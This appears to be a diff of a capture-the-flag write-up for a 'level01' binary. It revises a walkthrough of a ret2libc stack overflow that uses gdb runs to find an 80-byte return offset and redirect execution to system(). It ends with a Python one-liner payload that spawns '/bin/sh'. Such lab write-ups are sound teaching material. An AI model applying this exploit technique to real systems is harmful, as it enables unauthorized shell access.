@@ -38,29 +38,21 @@ The adress of "/bin/sh" is 0xf7f897ec
 
 We now need to find what is the offset of the return pointer:
 
-(gdb) r < <(python -c "print 'dat_wil' + '\x00' + '.' * 247 + '.' * 78 + 'aaaabbbbccccddddeeeeffffgggg'")
-(The program reads 255 chars for the username, we fill the buffer so that we can enter user and password in one print)
+(gdb) r < <(python -c "print 'dat_wil' + '\n' + '.' * 64 + 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'")
 
 Program received signal SIGSEGV, Segmentation fault.
-0x62626161 in ?? ()
+0x45454545 in ?? ()
 
-The offset is then 80 bytes (0x61 is 'a'), let's try to call "system":
+The offset is then 80 bytes (0x45 is 'E'), let's try to call "system":
 
 (gdb) b *0x080485b5 (at the end of the main function)
-(gdb) r < <(python -c "print 'dat_wil\x00' + 'A' * 247 + 'B' * 80 + '\xd0\xae\xe6\xf7' + '00001111222233334444'")
+(gdb) r < <(python -c "print 'dat_wil\n' + '.' * 80 + '\xd0\xae\xe6\xf7' + '00001111222233334444'")
 Breakpoint 1, 0x080485b5 in main ()
 (gdb) ni
 0xf7e6aed0 in system () from /lib32/libc.so.6
 
 We are in system!
-Now let's find where we need to place the adress of "/bin/sh":
 
-(gdb) x/2a $esp
-0xffffd71c:	0xf7e6aed0	0x30303030
-
-0x30 = '0', we can place the adress of the string directly after, our exploit is:
-
-(python -c "print 'dat_wil\x00' + 'A' * 247 + 'B' * 80 + '\xd0\xae\xe6\xf7' + '\xec\x97\xf8\xf7' * 5" && cat) | ./level01 
-
-The stack layout seemed to change a bit between multiple calls of system, so we put the adress of "/bin/sh" multiple times and it works
-
+The argument for a function needs to be placed 4 bytes after on the stack,
+our exploit will then be:
+(python -c "print 'dat_wil\n' + '.' * 80 + '\xd0\xae\xe6\xf7' + '....' + '\xec\x97\xf8\xf7'" && cat) | ./level01 
